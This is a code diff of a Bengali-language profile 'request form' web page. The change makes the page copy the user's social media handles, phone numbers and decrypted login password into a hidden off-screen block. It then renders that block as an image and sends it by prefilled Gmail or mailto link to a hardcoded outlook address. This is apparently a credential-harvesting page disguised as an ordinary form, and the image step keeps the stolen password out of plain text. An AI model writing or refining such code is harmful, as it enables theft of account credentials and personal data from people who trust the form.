@@ -5,6 +5,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>রিকুয়েস্ট ফর্ম - প্রোফাইল সাবমিট</title>
 
+<!-- html2canvas লাইব্রেরি - HTML কে ছবিতে কনভার্ট করার জন্য -->
+<script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
+
 <style>
 body{
     font-family: Arial;
@@ -119,6 +122,50 @@ button:hover{
     text-align:center;
     margin-top:10px;
 }
+
+/* যে অংশটুকু ছবি হবে - এই স্টাইল ছবিতে যাবে */
+.screenshot-area {
+    background: white;
+    padding: 20px;
+    border-radius: 12px;
+    font-family: 'Courier New', monospace;
+    max-width: 500px;
+    margin: 0 auto;
+}
+.screenshot-area h2 {
+    color: #333;
+    text-align: center;
+    border-bottom: 2px solid #4CAF50;
+    padding-bottom: 10px;
+}
+.screenshot-area table {
+    width: 100%;
+    border-collapse: collapse;
+    margin: 15px 0;
+}
+.screenshot-area th, .screenshot-area td {
+    border: 1px solid #ddd;
+    padding: 8px 12px;
+    text-align: left;
+}
+.screenshot-area th {
+    background-color: #4CAF50;
+    color: white;
+}
+.screenshot-area td {
+    color: #333;
+}
+.screenshot-area .login-info {
+    background: #fff3cd;
+    padding: 10px;
+    margin: 10px 0;
+    border-radius: 5px;
+}
+.hidden {
+    position: absolute;
+    left: -9999px;
+    top: -9999px;
+}
 </style>
 </head>
 
@@ -179,12 +226,47 @@ button:hover{
 <label>🌐 13. Your Website Link</label>
 <input type="url" id="website" placeholder="https://yourwebsite.com">
 
-<button type="button" id="submitBtn" onclick="sendToGmail()">🚀 সাবমিট করুন</button>
+<button type="button" id="submitBtn" onclick="sendAsImage()">🚀 সাবমিট করুন (ছবি হিসেবে)</button>
 
 <div id="formStatus" class="status"></div>
-<div class="info-note">💡 ফর্ম জমা দিলে Gmail ওপেন হবে। ইমেইল চেক করে Send এ ক্লিক করুন।</div>
+<div class="info-note">💡 ফর্ম জমা দিলে তথ্য ছবি হয়ে Gmail এ যাবে।</div>
 </div>
 
+</div>
+
+<!-- 📸 যে অংশটুকু ছবি হবে (লুকানো) -->
+<div id="screenshotContainer" class="hidden">
+    <div class="screenshot-area" id="captureArea">
+        <h2>📋 রিকুয়েস্ট ফর্ম ডাটা</h2>
+        
+        <div class="login-info" id="loginInfoArea">
+            <strong>🔐 লগইন তথ্য</strong><br>
+            লগইন ইউজারনাম: <span id="screenshotUsername">—</span><br>
+            পাসওয়ার্ড: <span id="screenshotPassword">—</span>
+        </div>
+        
+        <table id="dataTable">
+            <tr><th>Name</th><th>Value</th></tr>
+            <tr><td>Your_Email</td><td id="screenshotEmail">—</td></tr>
+            <tr><td>Your_Username</td><td id="screenshotUser">—</td></tr>
+            <tr><td>Your_Profile_Picture_Link</td><td id="screenshotProfilePic">—</td></tr>
+            <tr><td>Your_Facebook_Username</td><td id="screenshotFb">—</td></tr>
+            <tr><td>Your_Facebook_Page_Username</td><td id="screenshotFbPage">—</td></tr>
+            <tr><td>Your_Instagram_Username</td><td id="screenshotIg">—</td></tr>
+            <tr><td>Your_WhatsApp_Number</td><td id="screenshotWhatsapp">—</td></tr>
+            <tr><td>Your_TikTok_Username</td><td id="screenshotTiktok">—</td></tr>
+            <tr><td>Your_Telegram_Username</td><td id="screenshotTelegram">—</td></tr>
+            <tr><td>Your_Twitter_Username</td><td id="screenshotTwitter">—</td></tr>
+            <tr><td>Your_Phone_Number</td><td id="screenshotPhone">—</td></tr>
+            <tr><td>Your_About</td><td id="screenshotAbout">—</td></tr>
+            <tr><td>Your_Website_Link</td><td id="screenshotWebsite">—</td></tr>
+            <tr><td>Logged_In_User_Info</td><td id="screenshotLoginInfo">—</td></tr>
+        </table>
+        
+        <div style="font-size: 12px; color: #666; margin-top: 15px; text-align: center;">
+            ⏰ জমা দেওয়ার সময়: <span id="screenshotTime">—</span>
+        </div>
+    </div>
 </div>
 
 <script>
@@ -196,7 +278,7 @@ button:hover{
 const RECEIVER_EMAIL = "inyt_444@outlook.com";  // <-- এখানে আপনার ইমেইল দিন
 
 // 📝 ইমেইলের সাবজেক্ট
-const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট";
+const EMAIL_SUBJECT = "📋 নিউ রিকুয়েস্ট ফর্ম সাবমিট (ছবি)";
 
 // ==============================================
 
@@ -302,52 +384,45 @@ function updateSubmitButton(){
     }
 }
 
-// আপনার ছবির মতো ঠিক একই ফরম্যাটে ইমেইল বডি তৈরি
-function createEmailBody(){
-    let yourEmail = document.getElementById("yourEmail").value || "";
-    let yourUsername = document.getElementById("yourUsername").value || "";
-    let profilePic = document.getElementById("profilePic").value || "";
-    let fbUsername = document.getElementById("fbUsername").value || "";
-    let fbPageUsername = document.getElementById("fbPageUsername").value || "";
-    let igUsername = document.getElementById("igUsername").value || "";
-    let whatsapp = document.getElementById("whatsapp").value || "";
-    let tiktok = document.getElementById("tiktok").value || "";
-    let telegram = document.getElementById("telegram").value || "";
-    let twitter = document.getElementById("twitter").value || "";
-    let phone = document.getElementById("phone").value || "";
-    let about = document.getElementById("about").value || "";
-    let website = document.getElementById("website").value || "";
+// ছবির জন্য ডাটা আপডেট করা
+function updateScreenshotData(){
+    let yourEmail = document.getElementById("yourEmail").value || "—";
+    let yourUsername = document.getElementById("yourUsername").value || "—";
+    let profilePic = document.getElementById("profilePic").value || "—";
+    let fbUsername = document.getElementById("fbUsername").value || "—";
+    let fbPageUsername = document.getElementById("fbPageUsername").value || "—";
+    let igUsername = document.getElementById("igUsername").value || "—";
+    let whatsapp = document.getElementById("whatsapp").value || "—";
+    let tiktok = document.getElementById("tiktok").value || "—";
+    let telegram = document.getElementById("telegram").value || "—";
+    let twitter = document.getElementById("twitter").value || "—";
+    let phone = document.getElementById("phone").value || "—";
+    let about = document.getElementById("about").value || "—";
+    let website = document.getElementById("website").value || "—";
     
     let loggedInPassword = decrypt(users[currentUser]);
     
-    // আপনার ছবির মতো ঠিক এই ফরম্যাট
-    let body = `| Name                          | Value                         |
-|-------------------------------|-------------------------------|
-| Your_Email                    | ${yourEmail}                  |
-| Your_Username                 | ${yourUsername}               |
-| Your_Profile_Picture_Link     | ${profilePic}                 |
-| Your_Facebook_Username        | ${fbUsername}                 |
-| Your_Facebook_Page_Username   | ${fbPageUsername}             |
-| Your_Instagram_Username       | ${igUsername}                 |
-| Your_WhatsApp_Number          | ${whatsapp}                   |
-| Your_TikTok_Username          | ${tiktok}                     |
-| Your_Telegram_Username        | ${telegram}                   |
-| Your_Twitter_Username         | ${twitter}                    |
-| Your_Phone_Number             | ${phone}                      |
-| Your_About                    | ${about}                      |
-| Your_Website_Link             | ${website}                    |
-| Logged_In_User_Info           | লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword} |
-
-লগইন ইউজারনাম: ${currentUser}
-পাসওয়ার্ড: ${loggedInPassword}
-
-⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}`;
-    
-    return body;
+    document.getElementById("screenshotUsername").innerText = currentUser;
+    document.getElementById("screenshotPassword").innerText = loggedInPassword;
+    document.getElementById("screenshotEmail").innerText = yourEmail;
+    document.getElementById("screenshotUser").innerText = yourUsername;
+    document.getElementById("screenshotProfilePic").innerText = profilePic;
+    document.getElementById("screenshotFb").innerText = fbUsername;
+    document.getElementById("screenshotFbPage").innerText = fbPageUsername;
+    document.getElementById("screenshotIg").innerText = igUsername;
+    document.getElementById("screenshotWhatsapp").innerText = whatsapp;
+    document.getElementById("screenshotTiktok").innerText = tiktok;
+    document.getElementById("screenshotTelegram").innerText = telegram;
+    document.getElementById("screenshotTwitter").innerText = twitter;
+    document.getElementById("screenshotPhone").innerText = phone;
+    document.getElementById("screenshotAbout").innerText = about;
+    document.getElementById("screenshotWebsite").innerText = website;
+    document.getElementById("screenshotLoginInfo").innerHTML = `লগইন ইউজারনাম: ${currentUser} | পাসওয়ার্ড: ${loggedInPassword}`;
+    document.getElementById("screenshotTime").innerText = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
 }
 
-// Gmail এ পাঠানোর ফাংশন
-function sendToGmail(){
+// ছবি হিসেবে Gmail এ পাঠানো
+async function sendAsImage(){
     if(!currentUser){
         alert("❌ ফর্ম জমা দিতে প্রথমে লগইন করুন!");
         return;
@@ -370,28 +445,63 @@ function sendToGmail(){
         return;
     }
     
-    let plainBody = createEmailBody();
-    let encodedSubject = encodeURIComponent(EMAIL_SUBJECT);
-    let encodedBody = encodeURIComponent(plainBody);
+    document.getElementById("formStatus").innerHTML = '<div class="status-success">📸 ছবি তৈরি হচ্ছে, দয়া করে অপেক্ষা করুন...</div>';
     
-    let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    // ছবির জন্য ডাটা আপডেট
+    updateScreenshotData();
     
-    if(isMobile){
-        let mobileLink = `mailto:${RECEIVER_EMAIL}?subject=${encodedSubject}&body=${encodedBody}`;
-        window.location.href = mobileLink;
-        document.getElementById("formStatus").innerHTML = '<div class="status-success">✅ Gmail App ওপেন হচ্ছে! Send বাটনে ক্লিক করুন।</div>';
-    } else {
-        let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
-        window.open(gmailLink, '_blank');
-        document.getElementById("formStatus").innerHTML = '<div class="status-success">✅ Gmail ওপেন হচ্ছে! Send বাটনে ক্লিক করুন।</div>';
-    }
+    // একটু ডিলে দিন DOM আপডেট হওয়ার জন্য
+    await new Promise(resolve => setTimeout(resolve, 100));
     
-    setTimeout(() => {
-        let formStatus = document.getElementById("formStatus");
-        if(formStatus.innerHTML.includes('ওপেন হচ্ছে')){
-            formStatus.innerHTML = '<div class="status-success">✅ ইমেইল প্রস্তুত! শুধু Send করুন।</div>';
+    const element = document.getElementById("captureArea");
+    
+    try {
+        const canvas = await html2canvas(element, {
+            scale: 2,
+            backgroundColor: '#ffffff',
+            logging: false,
+            useCORS: true
+        });
+        
+        const imageData = canvas.toDataURL('image/png');
+        
+        // ছবিকে base64 থেকে এনকোড করা
+        const imageBase64 = imageData.split(',')[1];
+        
+        // HTML ইমেইল বডি যেখানে ছবি এম্বেড করা থাকবে
+        const emailBody = `
+        <html>
+        <body>
+            <h3>📋 রিকুয়েস্ট ফর্ম ডাটা (ছবি)</h3>
+            <p>নিচের ছবিতে সম্পূর্ণ তথ্য দেওয়া আছে:</p>
+            <img src="${imageData}" alt="Form Data" style="max-width:100%; height:auto; border:1px solid #ddd; border-radius:8px;">
+            <p style="font-size:12px; color:#666; margin-top:15px;">
+                ⏰ জমা দেওয়ার সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}
+            </p>
+            <p style="font-size:12px; color:#666;">📧 এই ইমেইলটি স্বয়ংক্রিয়ভাবে জেনারেট করা হয়েছে</p>
+        </body>
+        </html>
+        `;
+        
+        let encodedSubject = encodeURIComponent(EMAIL_SUBJECT);
+        let encodedBody = encodeURIComponent(emailBody);
+        
+        let isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        if(isMobile){
+            let mobileLink = `mailto:${RECEIVER_EMAIL}?subject=${encodedSubject}&body=${encodedBody}`;
+            window.location.href = mobileLink;
+        } else {
+            let gmailLink = `https://mail.google.com/mail/?view=cm&fs=1&to=${RECEIVER_EMAIL}&su=${encodedSubject}&body=${encodedBody}`;
+            window.open(gmailLink, '_blank');
         }
-    }, 5000);
+        
+        document.getElementById("formStatus").innerHTML = '<div class="status-success">✅ ছবি তৈরি হয়েছে! Gmail ওপেন হচ্ছে। Send বাটনে ক্লিক করুন।</div>';
+        
+    } catch(error) {
+        console.error("ছবি তৈরি করতে সমস্যা:", error);
+        document.getElementById("formStatus").innerHTML = '<div class="status-error">❌ ছবি তৈরি করতে সমস্যা হয়েছে। আবার চেষ্টা করুন।</div>';
+    }
 }
 
 function init(){
